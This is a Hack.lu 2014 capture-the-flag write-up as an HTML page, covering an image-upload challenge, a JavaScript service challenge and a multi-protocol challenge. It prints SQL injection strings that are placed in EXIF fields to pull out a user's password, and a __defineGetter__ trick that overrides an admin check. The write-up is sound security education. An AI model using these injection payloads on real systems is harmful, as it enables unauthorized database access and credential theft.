<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
    "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="application/xhtml+xml; charset=UTF-8" />
<meta name="generator" content="AsciiDoc 8.6.8" />
<title>Hack.lu 2014 Hacking Contest Write-Up</title>
<style type="text/css">
/* Shared CSS for AsciiDoc xhtml11 and html5 backends */

/* Default font. */
body {
  font-family: Georgia,serif;
}

/* Title font. */
h1, h2, h3, h4, h5, h6,
div.title, caption.title,
thead, p.table.header,
#toctitle,
#author, #revnumber, #revdate, #revremark,
#footer {
  font-family: Arial,Helvetica,sans-serif;
}

body {
  margin: 1em 5% 1em 5%;
}

a {
  color: blue;
  text-decoration: underline;
}
a:visited {
  color: fuchsia;
}

em {
  font-style: italic;
  color: navy;
}

strong {
  font-weight: bold;
  color: #083194;
}

h1, h2, h3, h4, h5, h6 {
  color: #527bbd;
  margin-top: 1.2em;
  margin-bottom: 0.5em;
  line-height: 1.3;
}

h1, h2, h3 {
  border-bottom: 2px solid silver;
}
h2 {
  padding-top: 0.5em;
}
h3 {
  float: left;
}
h3 + * {
  clear: left;
}
h5 {
  font-size: 1.0em;
}

div.sectionbody {
  margin-left: 0;
}

hr {
  border: 1px solid silver;
}

p {
  margin-top: 0.5em;
  margin-bottom: 0.5em;
}

ul, ol, li > p {
  margin-top: 0;
}
ul > li     { color: #aaa; }
ul > li > * { color: black; }

.monospaced, code, pre {
  font-family: "Courier New", Courier, monospace;
  font-size: inherit;
  color: navy;
  padding: 0;
  margin: 0;
}


#author {
  color: #527bbd;
  font-weight: bold;
  font-size: 1.1em;
}
#email {
}
#revnumber, #revdate, #revremark {
}

#footer {
  font-size: small;
  border-top: 2px solid silver;
  padding-top: 0.5em;
  margin-top: 4.0em;
}
#footer-text {
  float: left;
  padding-bottom: 0.5em;
}
#footer-badges {
  float: right;
  padding-bottom: 0.5em;
}

#preamble {
  margin-top: 1.5em;
  margin-bottom: 1.5em;
}
div.imageblock, div.exampleblock, div.verseblock,
div.quoteblock, div.literalblock, div.listingblock, div.sidebarblock,
div.admonitionblock {
  margin-top: 1.0em;
  margin-bottom: 1.5em;
}
div.admonitionblock {
  margin-top: 2.0em;
  margin-bottom: 2.0em;
  margin-right: 10%;
  color: #606060;
}

div.content { /* Block element content. */
  padding: 0;
}

/* Block element titles. */
div.title, caption.title {
  color: #527bbd;
  font-weight: bold;
  text-align: left;
  margin-top: 1.0em;
  margin-bottom: 0.5em;
}
div.title + * {
  margin-top: 0;
}

td div.title:first-child {
  margin-top: 0.0em;
}
div.content div.title:first-child {
  margin-top: 0.0em;
}
div.content + div.title {
  margin-top: 0.0em;
}

div.sidebarblock > div.content {
  background: #ffffee;
  border: 1px solid #dddddd;
  border-left: 4px solid #f0f0f0;
  padding: 0.5em;
}

div.listingblock > div.content {
  border: 1px solid #dddddd;
  border-left: 5px solid #f0f0f0;
  background: #f8f8f8;
  padding: 0.5em;
}

div.quoteblock, div.verseblock {
  padding-left: 1.0em;
  margin-left: 1.0em;
  margin-right: 10%;
  border-left: 5px solid #f0f0f0;
  color: #888;
}

div.quoteblock > div.attribution {
  padding-top: 0.5em;
  text-align: right;
}

div.verseblock > pre.content {
  font-family: inherit;
  font-size: inherit;
}
div.verseblock > div.attribution {
  padding-top: 0.75em;
  text-align: left;
}
/* DEPRECATED: Pre version 8.2.7 verse style literal block. */
div.verseblock + div.attribution {
  text-align: left;
}

div.admonitionblock .icon {
  vertical-align: top;
  font-size: 1.1em;
  font-weight: bold;
  text-decoration: underline;
  color: #527bbd;
  padding-right: 0.5em;
}
div.admonitionblock td.content {
  padding-left: 0.5em;
  border-left: 3px solid #dddddd;
}

div.exampleblock > div.content {
  border-left: 3px solid #dddddd;
  padding-left: 0.5em;
}

div.imageblock div.content { padding-left: 0; }
span.image img { border-style: none; }
a.image:visited { color: white; }

dl {
  margin-top: 0.8em;
  margin-bottom: 0.8em;
}
dt {
  margin-top: 0.5em;
  margin-bottom: 0;
  font-style: normal;
  color: navy;
}
dd > *:first-child {
  margin-top: 0.1em;
}

ul, ol {
    list-style-position: outside;
}
ol.arabic {
  list-style-type: decimal;
}
ol.loweralpha {
  list-style-type: lower-alpha;
}
ol.upperalpha {
  list-style-type: upper-alpha;
}
ol.lowerroman {
  list-style-type: lower-roman;
}
ol.upperroman {
  list-style-type: upper-roman;
}

div.compact ul, div.compact ol,
div.compact p, div.compact p,
div.compact div, div.compact div {
  margin-top: 0.1em;
  margin-bottom: 0.1em;
}

tfoot {
  font-weight: bold;
}
td > div.verse {
  white-space: pre;
}

div.hdlist {
  margin-top: 0.8em;
  margin-bottom: 0.8em;
}
div.hdlist tr {
  padding-bottom: 15px;
}
dt.hdlist1.strong, td.hdlist1.strong {
  font-weight: bold;
}
td.hdlist1 {
  vertical-align: top;
  font-style: normal;
  padding-right: 0.8em;
  color: navy;
}
td.hdlist2 {
  vertical-align: top;
}
div.hdlist.compact tr {
  margin: 0;
  padding-bottom: 0;
}

.comment {
  background: yellow;
}

.footnote, .footnoteref {
  font-size: 0.8em;
}

span.footnote, span.footnoteref {
  vertical-align: super;
}

#footnotes {
  margin: 20px 0 20px 0;
  padding: 7px 0 0 0;
}

#footnotes div.footnote {
  margin: 0 0 5px 0;
}

#footnotes hr {
  border: none;
  border-top: 1px solid silver;
  height: 1px;
  text-align: left;
  margin-left: 0;
  width: 20%;
  min-width: 100px;
}

div.colist td {
  padding-right: 0.5em;
  padding-bottom: 0.3em;
  vertical-align: top;
}
div.colist td img {
  margin-top: 0.3em;
}

@media print {
  #footer-badges { display: none; }
}

#toc {
  margin-bottom: 2.5em;
}

#toctitle {
  color: #527bbd;
  font-size: 1.1em;
  font-weight: bold;
  margin-top: 1.0em;
  margin-bottom: 0.1em;
}

div.toclevel0, div.toclevel1, div.toclevel2, div.toclevel3, div.toclevel4 {
  margin-top: 0;
  margin-bottom: 0;
}
div.toclevel2 {
  margin-left: 2em;
  font-size: 0.9em;
}
div.toclevel3 {
  margin-left: 4em;
  font-size: 0.9em;
}
div.toclevel4 {
  margin-left: 6em;
  font-size: 0.9em;
}

span.aqua { color: aqua; }
span.black { color: black; }
span.blue { color: blue; }
span.fuchsia { color: fuchsia; }
span.gray { color: gray; }
span.green { color: green; }
span.lime { color: lime; }
span.maroon { color: maroon; }
span.navy { color: navy; }
span.olive { color: olive; }
span.purple { color: purple; }
span.red { color: red; }
span.silver { color: silver; }
span.teal { color: teal; }
span.white { color: white; }
span.yellow { color: yellow; }

span.aqua-background { background: aqua; }
span.black-background { background: black; }
span.blue-background { background: blue; }
span.fuchsia-background { background: fuchsia; }
span.gray-background { background: gray; }
span.green-background { background: green; }
span.lime-background { background: lime; }
span.maroon-background { background: maroon; }
span.navy-background { background: navy; }
span.olive-background { background: olive; }
span.purple-background { background: purple; }
span.red-background { background: red; }
span.silver-background { background: silver; }
span.teal-background { background: teal; }
span.white-background { background: white; }
span.yellow-background { background: yellow; }

span.big { font-size: 2em; }
span.small { font-size: 0.6em; }

span.underline { text-decoration: underline; }
span.overline { text-decoration: overline; }
span.line-through { text-decoration: line-through; }

div.unbreakable { page-break-inside: avoid; }


/*
 * xhtml11 specific
 *
 * */

div.tableblock {
  margin-top: 1.0em;
  margin-bottom: 1.5em;
}
div.tableblock > table {
  border: 3px solid #527bbd;
}
thead, p.table.header {
  font-weight: bold;
  color: #527bbd;
}
p.table {
  margin-top: 0;
}
/* Because the table frame attribute is overriden by CSS in most browsers. */
div.tableblock > table[frame="void"] {
  border-style: none;
}
div.tableblock > table[frame="hsides"] {
  border-left-style: none;
  border-right-style: none;
}
div.tableblock > table[frame="vsides"] {
  border-top-style: none;
  border-bottom-style: none;
}


/*
 * html5 specific
 *
 * */

table.tableblock {
  margin-top: 1.0em;
  margin-bottom: 1.5em;
}
thead, p.tableblock.header {
  font-weight: bold;
  color: #527bbd;
}
p.tableblock {
  margin-top: 0;
}
table.tableblock {
  border-width: 3px;
  border-spacing: 0px;
  border-style: solid;
  border-color: #527bbd;
  border-collapse: collapse;
}
th.tableblock, td.tableblock {
  border-width: 1px;
  padding: 4px;
  border-style: solid;
  border-color: #527bbd;
}

table.tableblock.frame-topbot {
  border-left-style: hidden;
  border-right-style: hidden;
}
table.tableblock.frame-sides {
  border-top-style: hidden;
  border-bottom-style: hidden;
}
table.tableblock.frame-none {
  border-style: hidden;
}

th.tableblock.halign-left, td.tableblock.halign-left {
  text-align: left;
}
th.tableblock.halign-center, td.tableblock.halign-center {
  text-align: center;
}
th.tableblock.halign-right, td.tableblock.halign-right {
  text-align: right;
}

th.tableblock.valign-top, td.tableblock.valign-top {
  vertical-align: top;
}
th.tableblock.valign-middle, td.tableblock.valign-middle {
  vertical-align: middle;
}
th.tableblock.valign-bottom, td.tableblock.valign-bottom {
  vertical-align: bottom;
}


/*
 * manpage specific
 *
 * */

body.manpage h1 {
  padding-top: 0.5em;
  padding-bottom: 0.5em;
  border-top: 2px solid silver;
  border-bottom: 2px solid silver;
}
body.manpage h2 {
  border-style: none;
}
body.manpage div.sectionbody {
  margin-left: 3em;
}

@media print {
  body.manpage div#toc { display: none; }
}


</style>
<script type="text/javascript">
/*<![CDATA[*/
var asciidoc = {  // Namespace.

/////////////////////////////////////////////////////////////////////
// Table Of Contents generator
/////////////////////////////////////////////////////////////////////

/* Author: Mihai Bazon, September 2002
 * http://students.infoiasi.ro/~mishoo
 *
 * Table Of Content generator
 * Version: 0.4
 *
 * Feel free to use this script under the terms of the GNU General Public
 * License, as long as you do not remove or alter this notice.
 */

 /* modified by Troy D. Hanson, September 2006. License: GPL */
 /* modified by Stuart Rackham, 2006, 2009. License: GPL */

// toclevels = 1..4.
toc: function (toclevels) {

  function getText(el) {
    var text = "";
    for (var i = el.firstChild; i != null; i = i.nextSibling) {
      if (i.nodeType == 3 /* Node.TEXT_NODE */) // IE doesn't speak constants.
        text += i.data;
      else if (i.firstChild != null)
        text += getText(i);
    }
    return text;
  }

  function TocEntry(el, text, toclevel) {
    this.element = el;
    this.text = text;
    this.toclevel = toclevel;
  }

  function tocEntries(el, toclevels) {
    var result = new Array;
    var re = new RegExp('[hH]([1-'+(toclevels+1)+'])');
    // Function that scans the DOM tree for header elements (the DOM2
    // nodeIterator API would be a better technique but not supported by all
    // browsers).
    var iterate = function (el) {
      for (var i = el.firstChild; i != null; i = i.nextSibling) {
        if (i.nodeType == 1 /* Node.ELEMENT_NODE */) {
          var mo = re.exec(i.tagName);
          if (mo && (i.getAttribute("class") || i.getAttribute("className")) != "float") {
            result[result.length] = new TocEntry(i, getText(i), mo[1]-1);
          }
          iterate(i);
        }
      }
    }
    iterate(el);
    return result;
  }

  var toc = document.getElementById("toc");
  if (!toc) {
    return;
  }

  // Delete existing TOC entries in case we're reloading the TOC.
  var tocEntriesToRemove = [];
  var i;
  for (i = 0; i < toc.childNodes.length; i++) {
    var entry = toc.childNodes[i];
    if (entry.nodeName.toLowerCase() == 'div'
     && entry.getAttribute("class")
     && entry.getAttribute("class").match(/^toclevel/))
      tocEntriesToRemove.push(entry);
  }
  for (i = 0; i < tocEntriesToRemove.length; i++) {
    toc.removeChild(tocEntriesToRemove[i]);
  }

  // Rebuild TOC entries.
  var entries = tocEntries(document.getElementById("content"), toclevels);
  for (var i = 0; i < entries.length; ++i) {
    var entry = entries[i];
    if (entry.element.id == "")
      entry.element.id = "_toc_" + i;
    var a = document.createElement("a");
    a.href = "#" + entry.element.id;
    a.appendChild(document.createTextNode(entry.text));
    var div = document.createElement("div");
    div.appendChild(a);
    div.className = "toclevel" + entry.toclevel;
    toc.appendChild(div);
  }
  if (entries.length == 0)
    toc.parentNode.removeChild(toc);
},


/////////////////////////////////////////////////////////////////////
// Footnotes generator
/////////////////////////////////////////////////////////////////////

/* Based on footnote generation code from:
 * http://www.brandspankingnew.net/archive/2005/07/format_footnote.html
 */

footnotes: function () {
  // Delete existing footnote entries in case we're reloading the footnodes.
  var i;
  var noteholder = document.getElementById("footnotes");
  if (!noteholder) {
    return;
  }
  var entriesToRemove = [];
  for (i = 0; i < noteholder.childNodes.length; i++) {
    var entry = noteholder.childNodes[i];
    if (entry.nodeName.toLowerCase() == 'div' && entry.getAttribute("class") == "footnote")
      entriesToRemove.push(entry);
  }
  for (i = 0; i < entriesToRemove.length; i++) {
    noteholder.removeChild(entriesToRemove[i]);
  }

  // Rebuild footnote entries.
  var cont = document.getElementById("content");
  var spans = cont.getElementsByTagName("span");
  var refs = {};
  var n = 0;
  for (i=0; i<spans.length; i++) {
    if (spans[i].className == "footnote") {
      n++;
      var note = spans[i].getAttribute("data-note");
      if (!note) {
        // Use [\s\S] in place of . so multi-line matches work.
        // Because JavaScript has no s (dotall) regex flag.
        note = spans[i].innerHTML.match(/\s*\[([\s\S]*)]\s*/)[1];
        spans[i].innerHTML =
          "[<a id='_footnoteref_" + n + "' href='#_footnote_" + n +
          "' title='View footnote' class='footnote'>" + n + "</a>]";
        spans[i].setAttribute("data-note", note);
      }
      noteholder.innerHTML +=
        "<div class='footnote' id='_footnote_" + n + "'>" +
        "<a href='#_footnoteref_" + n + "' title='Return to text'>" +
        n + "</a>. " + note + "</div>";
      var id =spans[i].getAttribute("id");
      if (id != null) refs["#"+id] = n;
    }
  }
  if (n == 0)
    noteholder.parentNode.removeChild(noteholder);
  else {
    // Process footnoterefs.
    for (i=0; i<spans.length; i++) {
      if (spans[i].className == "footnoteref") {
        var href = spans[i].getElementsByTagName("a")[0].getAttribute("href");
        href = href.match(/#.*/)[0];  // Because IE return full URL.
        n = refs[href];
        spans[i].innerHTML =
          "[<a href='#_footnote_" + n +
          "' title='View footnote' class='footnote'>" + n + "</a>]";
      }
    }
  }
},

install: function(toclevels) {
  var timerId;

  function reinstall() {
    asciidoc.footnotes();
    if (toclevels) {
      asciidoc.toc(toclevels);
    }
  }

  function reinstallAndRemoveTimer() {
    clearInterval(timerId);
    reinstall();
  }

  timerId = setInterval(reinstall, 500);
  if (document.addEventListener)
    document.addEventListener("DOMContentLoaded", reinstallAndRemoveTimer, false);
  else
    window.onload = reinstallAndRemoveTimer;
}

}
asciidoc.install(4);
/*]]>*/
</script>
</head>
<body class="article">
<div id="header">
<h1>Hack.lu 2014 Hacking Contest Write-Up</h1>
<span id="author">Michael Denzel</span><br />
<span id="email"><code>&lt;<a href="mailto:m.denzel@cs.bham.ac.uk">m.denzel@cs.bham.ac.uk</a>&gt;</code></span><br />
<span id="revnumber">version 1.0,</span>
<span id="revdate">2014-10-23</span>
<div id="toc">
  <div id="toctitle">Table of Contents</div>
  <noscript><p><b>JavaScript must be enabled in your browser to display the table of contents.</b></p></noscript>
</div>
</div>
<div id="content">
<div class="sect1">
<h2 id="_challenge_9_imageupload_web">1. Challenge 9 - "ImageUpload" (Web)</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_description">1.1. Description</h3>
<div class="paragraph"><p>In the Wild Wild Web, there are really bad guys. The sheriff doesn&#8217;t know them all. Therefore, he needs your help.
Upload pictures of criminals to this site and help the sheriff to arrest them.
You can make this Wild Wild Web much less wild!!!</p></div>
<div class="paragraph"><p>Pictures will be deleted on regular basis!</p></div>
<hr />
</div>
<div class="sect2">
<h3 id="_solution">1.2. Solution</h3>
<div class="paragraph"><p>ImageUpload was a web based challenge. The website consisted of a Login page and an upload
section which accepted pictures (jpg/jpeg). After uploading a picture some
meta-information of the exif-header of images were displayed (height, width, author,
manufacturer, model).</p></div>
<div class="imageblock" id="imageupload_pic" style="text-align:center;">
<div class="content">
<img src="./imageupload.png" alt="./imageupload.png" width="60%" />
</div>
<div class="title">Figure 1. ImageUpload Website</div>
</div>
<div class="paragraph"><p>After unsuccessfully uploading a php shell (as shell.jpg), we focused on the exif data.</p></div>
<div class="paragraph"><p>There is a tool in Linux to modify this data:</p></div>
<div class="listingblock">
<div class="title">shell-code</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>exiftool -<span style="color: #990000">&lt;</span>EXIF-FIELD<span style="color: #990000">&gt;=&lt;</span>DATA<span style="color: #990000">&gt;</span> picture<span style="color: #990000">.</span>jpg</tt></pre></div></div>
<div class="paragraph"><p>Our first guesses were PHP and JavaScript since the data gets displayed on the website (see
<a href="#imageupload_pic">[imageupload_pic]</a> below the picture).</p></div>
<div class="paragraph"><p>But neither PHP nor JavaScript worked.</p></div>
<div class="paragraph"><p>We then realised that the website shows an error message, when putting an apostrophe <code>'</code>
into the exif data. This means the website is vulnerable to SQL injection attacks.</p></div>
<div class="paragraph"><p>Unfortunately, it turned out that the chosen exif field was integers-only (other fields were not
displayed correctly) and we had to deal with outputting numbers only.</p></div>
<div class="paragraph"><p>For the database we guessed the layout as a table "users" with columns "password" and "name".</p></div>
<div class="paragraph"><p>To prove it, we counted the password column in table users:</p></div>
<div class="listingblock">
<div class="title">SQL injection</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>exiftool -model<span style="color: #990000">=</span><span style="color: #FF0000">"' + (SELECT COUNT(password) FROM users) + '"</span> logo<span style="color: #990000">.</span>jpeg</tt></pre></div></div>
<div class="paragraph"><p>The resulting output "2" showed us that
- table users exists
- column password exists
- there are two users</p></div>
<div class="paragraph"><p>We further guessed one user as "sheriff" at the Login page and confirmed that column "name"
exists, too.</p></div>
<div class="paragraph"><p>To output the sheriff&#8217;s password in numbers we iterated over the password and printed the ascii
representation of the character. E.g. for the first character in ascii we queried the following:</p></div>
<div class="listingblock">
<div class="title">final attack string</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>exiftool -model<span style="color: #990000">=</span><span style="color: #FF0000">"' + (SELECT ASCII(SUBSTR(password, 0, 1)) FROM users WHERE name = 'sheriff') + '"</span> logo<span style="color: #990000">.</span>jpeg</tt></pre></div></div>
<div class="paragraph"><p>We retrieved the sheriff&#8217;s password as "AO7eikkOCucCFJOyyaaQ" and were able to login to retrieve
the flag <code>flag{1_5h07_7h3_5h3r1ff}</code> for 200+70 points.</p></div>
<div class="paragraph"><p>(joint work Andreea, Joe, Mike)</p></div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_challenge_11_objection_web">2. Challenge 11 - "Objection" (Web)</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_description_2">2.1. Description</h3>
<div class="paragraph"><p>This guard talks a weird dialect. And why does he talk in such a complicated way? <a href="./objection_4966674d17ff296939c0e3dfccfe87ed.co">Download</a></p></div>
<div class="paragraph"><p>nc wildwildweb.fluxfingers.net 1408</p></div>
<hr />
</div>
<div class="sect2">
<h3 id="_solution_2">2.2. Solution</h3>
<div class="paragraph"><p>We were able to translate the code into JavaScript using LiveScript: <a href="./objection.js">objection.js</a></p></div>
<div class="paragraph"><p>When looking at the code, the following line is vulnerable.</p></div>
<div class="listingblock">
<div class="title">vulnerable line in JavaScript</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">if</span></span> <span style="color: #990000">(</span><span style="font-weight: bold"><span style="color: #0000FF">typeof</span></span> client_context<span style="color: #990000">[</span>funcname<span style="color: #990000">]</span> <span style="color: #990000">!==</span> <span style="color: #FF0000">'function'</span><span style="color: #990000">)</span> <span style="color: #FF0000">{</span>
        <span style="font-weight: bold"><span style="color: #0000FF">return</span></span> con<span style="color: #990000">.</span><span style="font-weight: bold"><span style="color: #000000">write</span></span><span style="color: #990000">(</span><span style="color: #FF0000">"error: unknown function "</span> <span style="color: #990000">+</span> funcname <span style="color: #990000">+</span> <span style="color: #FF0000">"</span><span style="color: #CC33CC">\n</span><span style="color: #FF0000">"</span><span style="color: #990000">);</span>
<span style="color: #FF0000">}</span></tt></pre></div></div>
<div class="paragraph"><p>It only checks if the function <code>funcname</code> exists. But this also includes inherited functions
of the object <code>client_context</code> like e. g. <code>toString()</code>.</p></div>
<div class="paragraph"><p>We, therefore, tried to redefine functions using <code>eval()</code>, lamdba-functions, <code>__defineSetter__</code>
and succeeded with <code>__defineGetter__</code>.</p></div>
<div class="paragraph"><p><code>__defineGetter__(name, function)</code> overwrites a label with a function and makes it into a getter.
The resulting "function" can be used as a normal variable:</p></div>
<div class="listingblock">
<div class="title">example code</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">var</span></span> finite <span style="color: #990000">=</span> <span style="color: #FF0000">{}</span>
finite<span style="color: #990000">.</span><span style="font-weight: bold"><span style="color: #000000">__defineGetter__</span></span><span style="color: #990000">(</span><span style="color: #FF0000">"monkeys"</span><span style="color: #990000">,</span> <span style="font-weight: bold"><span style="color: #0000FF">function</span></span><span style="color: #990000">()</span><span style="color: #FF0000">{</span><span style="font-weight: bold"><span style="color: #0000FF">return</span></span> <span style="color: #FF0000">"monkeys rock!"</span><span style="color: #990000">;</span><span style="color: #FF0000">}</span>
console<span style="color: #990000">.</span><span style="font-weight: bold"><span style="color: #000000">log</span></span><span style="color: #990000">(</span>finite<span style="color: #990000">.</span>monkeys<span style="color: #990000">)</span> <span style="font-style: italic"><span style="color: #9A1900">//notice the missing brackets - not: finite.monkeys()</span></span>
<span style="font-style: italic"><span style="color: #9A1900">//prints "monkeys rock!" to the console</span></span></tt></pre></div></div>
<div class="paragraph"><p>The only problem is that we do not control the second parameter. The function is
given in the code:</p></div>
<div class="listingblock">
<div class="title">attacked part of the JavaScript code</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>client_context<span style="color: #990000">[</span>funcname<span style="color: #990000">](</span>args<span style="color: #990000">,</span> <span style="font-weight: bold"><span style="color: #0000FF">function</span></span><span style="color: #990000">(</span>it<span style="color: #990000">)</span><span style="color: #FF0000">{</span>
        <span style="font-weight: bold"><span style="color: #0000FF">return</span></span> con<span style="color: #990000">.</span><span style="font-weight: bold"><span style="color: #000000">write</span></span><span style="color: #990000">(</span>it <span style="color: #990000">+</span> <span style="color: #FF0000">"</span><span style="color: #CC33CC">\n</span><span style="color: #FF0000">"</span><span style="color: #990000">);</span>
<span style="color: #FF0000">}</span><span style="color: #990000">);</span></tt></pre></div></div>
<div class="paragraph"><p>But, since it usually succeeds to write to the connection, it returns true!</p></div>
<div class="paragraph"><p>So we used <code>__defineGetter__</code> to overwrite the variable <code>is_admin</code> in order to gain admin
privileges.</p></div>
<div class="listingblock">
<div class="title">attack</div>
<div class="content">
<pre><code>hello!
__defineGetter__ is_admin
get_token
undefined
The current token is flag{real_cowboys_dont_use_object_create_null}</code></pre>
</div></div>
<div class="paragraph"><p><code>__defineGetter__ is_admin</code> overwrites the variable <code>is_admin</code> with a getter which uses the
next argument - here: <code>function(it){return con.write(it + "\n");}</code> - and always returns true.</p></div>
<div class="paragraph"><p>The flag was afterwards retrieved for 150+80 points using <code>get_token</code>.</p></div>
<div class="paragraph"><p>(joint work Chris, Mike)</p></div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_challenge_31_wanted_translator_misc">3. Challenge 31 - "Wanted: Translator" (Misc)</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_description_3">3.1. Description</h3>
<div class="paragraph"><p>We are in desperate need of a translator who understands the languages of varoius Indian tribes. We already know how to speak to the Apache tribe via HTTP but we have some stuff missing. We offer 5$ per successfully translated language.</p></div>
<div class="paragraph"><p>(That means you can send us 7 solutions to this challenge and will receive 5 points for each.)</p></div>
<div class="literalblock">
<div class="content">
<pre><code>SMTP
GOPHER
POP3
FINGER
TFTP
IRC
NNTP</code></pre>
</div></div>
<hr />
</div>
<div class="sect2">
<h3 id="_solution_3">3.2. Solution</h3>
<div class="paragraph"><p>We realised that there was a tftp server running since it was possible to connect with the
following command.</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>tftp wildwildweb<span style="color: #990000">.</span>fluxfingers<span style="color: #990000">.</span>net</tt></pre></div></div>
<div class="paragraph"><p>Afterwards we used the default ports and programs to connect to the other protocols:</p></div>
<div class="sect3">
<h4 id="_smtp">3.2.1. SMTP</h4>
<div class="ulist"><ul>
<li>
<p>
connect to port 25 with telnet
</p>
</li>
<li>
<p>
send mail to <code>fluxfingers@rub.de</code>
</p>
</li>
</ul></div>
</div>
<div class="sect3">
<h4 id="_gopher">3.2.2. GOPHER</h4>
<div class="ulist"><ul>
<li>
<p>
connection: <code>telnet wildwildweb.fluxfingers.net gopher</code>
</p>
</li>
<li>
<p>
send <code>\r\n</code>
</p>
</li>
<li>
<p>
reconnect
</p>
</li>
<li>
<p>
send <code>0\r\n</code>
</p>
</li>
</ul></div>
</div>
<div class="sect3">
<h4 id="_pop3">3.2.3. POP3</h4>
<div class="ulist"><ul>
<li>
<p>
<code>USER flux</code>
</p>
</li>
<li>
<p>
<code>PASS flux</code>
</p>
</li>
<li>
<p>
<code>LIST</code>
</p>
</li>
<li>
<p>
<code>RETR 1</code>
</p>
</li>
</ul></div>
</div>
<div class="sect3">
<h4 id="_finger">3.2.4. FINGER</h4>
<div class="ulist"><ul>
<li>
<p>
connected to port 79 using telnet
</p>
</li>
<li>
<p>
send <code>\r\n</code> to get user list
</p>
</li>
<li>
<p>
reconnect
</p>
</li>
<li>
<p>
send <code>r00t\r\n</code> to get details for the user r00t
</p>
</li>
</ul></div>
</div>
<div class="sect3">
<h4 id="_tftp">3.2.5. TFTP</h4>
<div class="paragraph"><p>The port was open but TFTP does not support a list command, so we wrote a script.
Guessing the name of the file is another solution.</p></div>
<div class="listingblock">
<div class="title">perl script</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>perl <span style="color: #990000">-</span>MNet<span style="color: #990000">::</span>TFTP <span style="color: #990000">-</span>e <span style="color: #FF0000">'$tftp = Net::TFTP-&gt;new("wildwildweb.fluxfingers.net"); $tftp-&gt;get("flag", \*STDOUT);'</span></tt></pre></div></div>
<div class="listingblock">
<div class="title">connection with tftp</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>tftp wildwildweb<span style="color: #990000">.</span>fluxfingers<span style="color: #990000">.</span>net
tftp<span style="color: #990000">&gt;</span> get flag</tt></pre></div></div>
<div class="paragraph"><p><a href="./tftp.txt">Here</a> is the file, including a bonus text adventure.</p></div>
</div>
<div class="sect3">
<h4 id="_irc">3.2.6. IRC</h4>
<div class="ulist"><ul>
<li>
<p>
connected to port 6667
</p>
</li>
<li>
<p>
listed the channels with /list
</p>
</li>
<li>
<p>
joined channel #flagchannel
</p>
</li>
<li>
<p>
send a private message to flagbot.
</p>
</li>
</ul></div>
</div>
<div class="sect3">
<h4 id="_nntp">3.2.7. NNTP</h4>
<div class="ulist"><ul>
<li>
<p>
connection: <code>telnet wildwildweb.fluxfingers.net nntp</code>
</p>
</li>
<li>
<p>
<code>GROUP apache.chitchat</code>
</p>
</li>
<li>
<p>
<code>NEXT</code>
</p>
</li>
<li>
<p>
<code>ARTICLE</code>
</p>
</li>
</ul></div>
<div class="paragraph"><p>5 points per challenge makes 35 points in total.</p></div>
<div class="paragraph"><p>(joint work Chris, Joe, Mike, Sam)</p></div>
</div>
</div>
</div>
</div>
</div>
<div id="footnotes"><hr /></div>
<div id="footer">
<div id="footer-text">
Version 1.0<br />
Last updated 2014-10-23 18:59:23 BST
</div>
</div>
</body>
</html>
